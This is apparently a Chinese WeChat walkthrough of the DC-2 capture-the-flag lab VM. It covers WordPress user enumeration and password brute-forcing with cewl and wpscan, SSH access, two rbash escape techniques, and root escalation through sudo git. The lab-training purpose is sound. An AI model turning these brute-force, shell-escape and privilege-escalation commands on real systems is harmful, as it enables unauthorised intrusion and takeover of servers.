> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/6ljJk-Y_SKhwJP4a6yhTYg)

**01 前期准备**

今天咱们要渗透的靶机是 dc-2, 先把 dc-2 部署到虚拟机当中

下载地址是：https://www.five86.com/dc-2.html

 ![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kfLB6bSAhWrHNDhoHdSCs4mgz8eoX4n8doqbhqSwtW5S8n9bCv2QZLw/640?wx_fmt=png)

导入成功，启动，接下来咱们就开始拿下这个服务器

**02  信息收集**  

首先我们得知道靶机的 ip 地址是多少？  

执行命令

> netdiscover -r  192.168.202.0/24

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kv4ytX4b7iaWUdWzTpY5Ebiax2mV6WYaqv6Ktb2G6Dibw4griay1m1FCejA/640?wx_fmt=png) 

直接获取到虚拟机的 ip，这里有个小 tip，把系统导入到虚拟机当中，会自动获取到系统的 MAC 地址，只需要在设置中进行查看

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kBHLBRpWhSpZKsLJDBQU7MlvcXKaCvMhVRBX7TQ5yM2vZUhkyg3tcbA/640?wx_fmt=png) 

既然知道了靶机 IP，那么就看下靶机上开了哪些端口

执行命令

> nmap -A   192.168.202.111 -p 1-65535

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kKhiajtkatAULJXMib3UDj3mH3AvlEc0u2WE5dpfXU8uXPzO1TdRrwG6g/640?wx_fmt=png)  

可以看到打开了 80，7744 端口，那我们先从页面中访问一下

**03 域名映射**

有意思的是我们访问页面，但根本访问不了

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kBJopEN0iamsTQABCHQDwc86a6pFnhvO13ZxCcWaDeTpbUmAmv6GN9gg/640?wx_fmt=png)

这是因为靶机做了域名绑定，他会自动跳转到 dc-2 上，所以我们需要在本地做个域名映射

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kicyqjHorqsqYfYNcj5lpa9TfjxLImrzibXC5ibG57iaUaoHle8qRIwaiagg/640?wx_fmt=png) 

打开 C:\Windows\System32\drivers\etc 下的 hosts 文件在末尾加入

192.168.202.111   dc-2 (记住写上自己靶机的 IP)

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kIbU9hsvyjBaNibjLAKUjPO77O5SMg3uQm4UNUGpwsiaicyHZib5Ij61RNg/640?wx_fmt=png)

然后保存之后访问页面

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kfbV9G9AAFP3mwp4vPOhiaBEwAnqXpEPkHS33ia9gGQejMaaew1iahkRCA/640?wx_fmt=png) 

可以看到现在访问成功

当然咱们 kali 也需要进行进行配置

> vi   /etc/hosts

将 192.168.202.111   dc-2 加入末尾

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kqZF2zPuyFCibLtqdH6qVgUNDpXmv3XXk4lKBibSKd0XDiamffu9DrMvYw/640?wx_fmt=png)

保存退出

ping dc-2

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kopzOJZ7UaS4ojSjfVWjo8SsBYDqCtVjNEevSVOmh4jg8wdiaPOUVFnA/640?wx_fmt=png)

只要可以 ping 通那么 kali 也就配好了

现在进入页面，直接点击 flag，我们可以看到第一个提示

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0k5dNtia9t3FSkV6VBiaT5w0KibrzIf50NVxtIu2LjmEcibWGNThwhOdGzmQ/640?wx_fmt=png) 

通过页面我们可以看出这个 CMS 是典型的 WordPress 框架，而且提示中告诉我们需要通过 cewl 工具生成密码

**04 密码生成**

cewl 是一款 kali 的密码攻击工具，只需要把 url 告诉 cewl，它就会根据页面生成密码列表

进入咱们的 kali 攻击机

执行命令

> cewl -w pass.txt http://dc-2/

这个时候我们可以看到创建好了一个带有密码的 pass.txt 文件

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0ketk9wvJDNL3c8wicsK02zB7egebeZm3jODBzAAtdVyyhWniaYvzJpORg/640?wx_fmt=png) 

可是光有密码还是不行，我们还得需要账号，那账号怎么生成呢？

我们可以利用一个神器工具，WPScan，这个工具是专门用来扫描 WordPress 漏洞的黑盒子扫描器。

在 kali 中执行

> wpscan  --url dc-2 -e u

这条命令的意思是生成当前页面可能存在的账户名

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kzIHvBp3sGgQPf6KI2nG2EHWGpBMBic2iaw64zBz2EbDAib3jOO3esCSpQ/640?wx_fmt=png) 

可以看到生成了三个用户名：admin，jerry，tom

把三个用户名放入 user.txt 当中 

> vi user.txt

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0k9WxMW5xxzVJ6xKcTdaoKlISvCOQCfcFmDwPSIEriaIpqbbMibd22vOIA/640?wx_fmt=png)

保存退出

既然现在有了账户又有了密码，那我们就需要找到登录后台页面

执行

> dirb http://dc-2

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kSyicE1hr65T2xk7I5CRibhkkp3JJcqBMqwEkPHaMhMWm5O3lZH4dRv4Q/640?wx_fmt=png) 

获取到可以访问的目录，其中包括了后台地址 ：

> http://dc-2/wp-admin/

访问一下

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kCDaMwBTtanJlFs6d3QZTxwTuYKTGnDIR5PAqmtKHGgslFBljUk7ictw/640?wx_fmt=png) 

**05 Wpscan 爆破**

既然有了账号和密码，就可以进行爆破

执行命令

> wpscan --url dc-2 -U user.txt -P pass.txt

通过上面的命令会直接进行后台登录密码爆破

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kyYBSADWfMq1hPDHddHeRxibhxxjKA7AKsGN8hUrRia6YCgq2Q6U27JoQ/640?wx_fmt=png)

成功爆出两个登录名和密码

> jerry / adipiscing                       

> tom / parturient

**06 后台操作**

用两个账号依次进行登录，发现 tom 这个账号没办法登录，但是 jerry 这个账号是可以登录的

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0klyVBj1t6deNqoiazBYGlJdCsoIQRPLghr5lh9OicwIfwTtR9iaokeHyGg/640?wx_fmt=png) 

顺利拿到 flag1 和 flag2

**07  连接服务器**

根据 flag2 的提示，既然 tom 登录不了，可以尝试做为 ssh 登录账号和密码

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kGCJF9WHicy7pqA1T94OuMxBj9dsFGHM3oQGmE12ExEeIYVmLxK23WrQ/640?wx_fmt=png) 

在 kali 中执行命令

> ssh tom@192.168.202.111 -p 7744

输入 yes

输入 tom 的密码

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kUbcPC8ZmyBsmCdib5AtTmnMDDm8AMFA5fLEjMPfblpsvKepPrIibwpow/640?wx_fmt=png) 

成功连接服务器

执行

> ls

可以看到 flag3.txt

可惜 cat 命令没办法执行，但是可以通过 vi 查看 flag3.txt

执行

> vi flag3.txt

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kibkAPuW8DzQZ37baFSUsh4swBFrbMdoNBA4DcHmZyoRWXYZ476HBkuA/640?wx_fmt=png)  

通过提示可以使用 jerry 的账号，而且我们在 tom 账号下，执行任何命令时都没办法执行成功，因为 tom 账号的解释器是 **rbash。**

Rbash 是受限制的 bash，限制了 bash shell 的一些功能，主要用作中转服务器，或者仅使用 ssh 来进行访问的特殊 bash，起到保护的作用。

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kicXNe5yvVWSd3EiaFicuBGUHom74fXLn1PWDsCUibIvI44j6upPAjy12Qg/640?wx_fmt=png)

接下来介绍两种方式绕过 rbash

**08 使用 vi 绕过 rabsh**

Tom 账号下，除了 vi 命令可以进行执行，任何命令都无法执行时，我们可以尝试进行 vi 绕过 rabsh。

执行

> echo /home/tom(用户名)/usr/bin/*

查看当前用户可以使用的命令

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0k10ehBo3YXjNKCCT9YJ5l7J5dpxiaB2dNGCTncz5JzYStP61fRCQn7dw/640?wx_fmt=png)

执行

> vi test

Shift+:  进入命令行模式

> 输入 set shell=/bin/sh

回车

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kAxcMy8AV8LqIOQXRJBLarA1IG4MwnYjUviaVHnkc3khr6g3qNHxB4NQ/640?wx_fmt=png)

Shift+:  进入命令行模式

输入 shell

回车

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kwvoQHFiaQCypncMK1ZkVH8oMjAhibdwVdicibOsAEK9rdHeCgWyS70sFqw/640?wx_fmt=png)

进入

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0ka9v56jlW2vBYqRZ99O8wr6cicpPLicJK17olHmpmWG6nahNIbdxleic5A/640?wx_fmt=png) 

执行

> export PATH=/usr/sbin:/usr/bin:/sbin:/bin

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kgvCmXLs6gwHEe9l8ypMjCG6F3G1C9LveAt9tOuTmxxaGz7tltU8DJw/640?wx_fmt=png) 

su jerry 输入之前爆出来的密码，直接进入 jerry 账户

**09 更改环境变量绕过 rbash**

在 tom 账号下

执行

> echo $0

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kZUkG2nyPjuCqQiajOJKnJLlCAYhPoDSEFEHHP3UhGhZQa527Iibf9Wzw/640?wx_fmt=png) 

可以看到当前用户的执行权限

好，现在我们的目的就是解锁 tom 的 rbash，让其拥有 bash 权限

依次执行一下命令

> BASH_CMDS[a]=/bin/sh;a
> 
> /bin/bash
> 
> export PATH=$PATH:/bin/
> 
> export PATH=$PATH:/usr/bin

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kibicQ8jHt7y1CMJbDm3dP7RUKw3zOnm2l0oFHt3icCQ1QHG92ricK8qerQ/640?wx_fmt=png) 

可以看到 tom 拥有了 bssh 权限

然后执行

su jerry 输入之前爆出来的密码，直接进入 jerry 账户

**10 权限提升**

进入 jerry 账号，可以看到给我们的第 4 个提示

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kucLicLu6879H6w7yh5XVOajpafo0oRokiazbM3B2hvxMMZHVUPkL7AEg/640?wx_fmt=png) 

提示我们进行 git 提权

执行

> sudo -l 

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kzbRbJervkKWveppqfXtQb9DbFJgklIxYYOYL4OApBCibIULjOPKrlnA/640?wx_fmt=png)

可以看到 (root) NOPASSWD: /usr/bin/git

git 是 root 免密执行，既然如此使用 git 提权

从这五个命令中依次进行尝试执行，总有一条可以成功

> sudo git -p --help
> 
> sudo git -p config
> 
> sudo git --help  config
> 
> sudo git -p --help config
> 
> sudo git help config

直到出现，输入命令行

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kq7ibetWsCpicKvHhu6ssT8zsP1DZZiakhlN0lqrsc4U7s7Xibqicickq6PTA/640?wx_fmt=png)

输入 

> !/bin/bash

 ![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kIa2rGMyVCEYnzWqOBBhQqGT4U5hsCQp6qA1sPdsrEdR01VLrSjVtWg/640?wx_fmt=png)

获取到 root 权限

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kgoiaWjllJtfb2QX6dvLvZic1cIdm8flB9dxs5sINGT6KKCnF1PsUdDFw/640?wx_fmt=png) 

查看最后一个 flag

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kcDiclJ7UVNib6yLNTiczOSexhKGqASD20bDUQEiczibvlqU0hiboNrV0HPsg/640?wx_fmt=png) 

**渗透成功!**

**11  总结**

a. 当发现 CMS 是用的 WordPress 的框架搭建的，那么可以使用 cewl 字典生成器，wpscan 工具联合进行渗透攻击。

b. 学会使用多种方法绕过 rbash 限制。

c. 使用 git 命令进行提权，以上给出了命令，直到弹出命令行为止，因为我在这里渗透时，很多常用的 git 提权命令都无法成功弹出命令行，所以这里需要大家多尝试。

-END-

![](https://mmbiz.qpic.cn/mmbiz_gif/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kuOicSibeTvb9jZRr0hdtgUfqPZfvPib5qheB4m6LdzpKeSUh34JQ5gN1A/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_jpg/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kibGsTzkuhHibibbhib3KOIl5DW0zszpaa0osEUDF6pkBt1jLZlBUtSOxeQ/640?wx_fmt=jpeg)

微信号：Zero-safety

- 扫码关注我们 -

带你领略不一样的世界

![](https://mmbiz.qpic.cn/mmbiz_gif/eqGGHicCG3MaqVDBQGx3gfdOrdRjPQv0kocZVQqJgOhh3QIiafLQuhehkRXcAAC5EcaGMGlJZW2yiap6HOh0qQYCw/640?wx_fmt=gif)